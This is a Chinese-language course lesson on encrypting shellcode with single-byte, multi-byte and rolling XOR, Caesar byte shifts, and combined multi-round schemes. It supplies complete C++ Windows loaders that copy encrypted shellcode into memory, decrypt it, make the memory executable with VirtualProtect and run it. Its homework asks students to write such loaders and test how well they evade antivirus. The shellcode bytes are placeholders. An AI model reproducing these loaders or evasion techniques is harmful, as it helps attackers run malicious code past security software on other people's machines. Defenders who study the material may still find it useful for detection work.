# 课时23：异或和凯撒加密ShellCode

## 1. 课程目标

深入学习XOR和凯撒加密在ShellCode加密中的实际应用。

---

## 2. XOR加密详解

### 2.1 单字节XOR

```cpp
#include <windows.h>
#include <stdio.h>

// 单字节XOR加密
void XORSingleByte(LPBYTE pData, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= key;
    }
}

// 加密工具
void GenerateXOREncrypted(LPBYTE pShellcode, SIZE_T size, BYTE key) {
    printf("// XOR加密 (Key: 0x%02X)\n", key);
    printf("unsigned char encrypted[] = {\n    ");
    
    for (SIZE_T i = 0; i < size; i++) {
        printf("0x%02X", pShellcode[i] ^ key);
        if (i < size - 1) printf(", ");
        if ((i + 1) % 16 == 0) printf("\n    ");
    }
    printf("\n};\n");
}
```

### 2.2 多字节XOR

```cpp
// 多字节密钥更难破解
void XORMultiByte(LPBYTE pData, SIZE_T size, LPBYTE pKey, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= pKey[i % keyLen];
    }
}

// 完整Loader
int main() {
    unsigned char encrypted[] = { /* 加密数据 */ };
    unsigned char key[] = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48 };
    
    SIZE_T size = sizeof(encrypted);
    LPVOID pMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(pMem, encrypted, size);
    
    // 解密
    XORMultiByte((LPBYTE)pMem, size, key, sizeof(key));
    
    // 执行
    DWORD old;
    VirtualProtect(pMem, size, PAGE_EXECUTE_READ, &old);
    ((void(*)())pMem)();
    
    return 0;
}
```

### 2.3 滚动XOR

```cpp
// 每个字节使用前一个密文作为密钥
void RollingXOR(LPBYTE pData, SIZE_T size, BYTE initKey) {
    BYTE key = initKey;
    for (SIZE_T i = 0; i < size; i++) {
        BYTE original = pData[i];
        pData[i] ^= key;
        key = original;  // 使用原始字节作为下一个密钥
    }
}

void RollingXORDecrypt(LPBYTE pData, SIZE_T size, BYTE initKey) {
    BYTE key = initKey;
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= key;
        key = pData[i];  // 使用解密后的字节
    }
}
```

---

## 3. 凯撒加密详解

### 3.1 基础凯撒

```cpp
// 字节偏移加密
void CaesarEncrypt(LPBYTE pData, SIZE_T size, int shift) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (BYTE)((pData[i] + shift) & 0xFF);
    }
}

void CaesarDecrypt(LPBYTE pData, SIZE_T size, int shift) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (BYTE)((pData[i] - shift) & 0xFF);
    }
}
```

### 3.2 变量偏移凯撒

```cpp
// 每个字节使用不同的偏移量
void VariableCaesar(LPBYTE pData, SIZE_T size, LPBYTE shifts, SIZE_T shiftLen) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (BYTE)((pData[i] + shifts[i % shiftLen]) & 0xFF);
    }
}

void VariableCaesarDecrypt(LPBYTE pData, SIZE_T size, LPBYTE shifts, SIZE_T shiftLen) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (BYTE)((pData[i] - shifts[i % shiftLen]) & 0xFF);
    }
}
```

---

## 4. 组合加密

### 4.1 XOR + 凯撒

```cpp
// 先XOR再凯撒，增加破解难度
void CombinedEncrypt(LPBYTE pData, SIZE_T size, BYTE xorKey, int shift) {
    // 第一层：XOR
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= xorKey;
    }
    // 第二层：凯撒
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (BYTE)((pData[i] + shift) & 0xFF);
    }
}

void CombinedDecrypt(LPBYTE pData, SIZE_T size, BYTE xorKey, int shift) {
    // 反向：先解凯撒
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (BYTE)((pData[i] - shift) & 0xFF);
    }
    // 再解XOR
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= xorKey;
    }
}
```

### 4.2 多轮加密

```cpp
// 多轮增加复杂度
void MultiRoundEncrypt(LPBYTE pData, SIZE_T size, int rounds) {
    for (int r = 0; r < rounds; r++) {
        BYTE key = (BYTE)(r * 17 + 0x41);
        int shift = r * 7 + 3;
        
        for (SIZE_T i = 0; i < size; i++) {
            pData[i] ^= key;
            pData[i] = (BYTE)((pData[i] + shift) & 0xFF);
        }
    }
}

void MultiRoundDecrypt(LPBYTE pData, SIZE_T size, int rounds) {
    for (int r = rounds - 1; r >= 0; r--) {
        BYTE key = (BYTE)(r * 17 + 0x41);
        int shift = r * 7 + 3;
        
        for (SIZE_T i = 0; i < size; i++) {
            pData[i] = (BYTE)((pData[i] - shift) & 0xFF);
            pData[i] ^= key;
        }
    }
}
```

---

## 5. 完整示例

```cpp
#include <windows.h>
#include <stdio.h>

// 加密后的ShellCode（示例）
unsigned char encryptedSC[] = {
    0x12, 0x34, 0x56, 0x78  // 替换为实际数据
};

// 密钥
BYTE xorKey = 0x55;
int caesarShift = 13;

void DecryptAndRun() {
    SIZE_T size = sizeof(encryptedSC);
    
    // 分配内存
    LPVOID pMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(pMem, encryptedSC, size);
    LPBYTE pData = (LPBYTE)pMem;
    
    // 解密（凯撒 -> XOR）
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (BYTE)((pData[i] - caesarShift) & 0xFF);
    }
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= xorKey;
    }
    
    // 执行
    DWORD old;
    VirtualProtect(pMem, size, PAGE_EXECUTE_READ, &old);
    ((void(*)())pMem)();
    
    VirtualFree(pMem, 0, MEM_RELEASE);
}

int main() {
    DecryptAndRun();
    return 0;
}
```

---

## 6. 课后作业

### 作业1：基础加密（必做）

1. 使用XOR加密一段ShellCode
2. 编写Loader解密并执行

### 作业2：组合加密（必做）

1. 实现XOR+凯撒组合加密
2. 测试免杀效果

### 作业3：自定义加密（进阶）

1. 设计自己的加密算法
2. 确保可以正确解密执行

---

## 7. 下一课预告

下一课我们将学习使用标准加密算法（AES等）加密ShellCode。
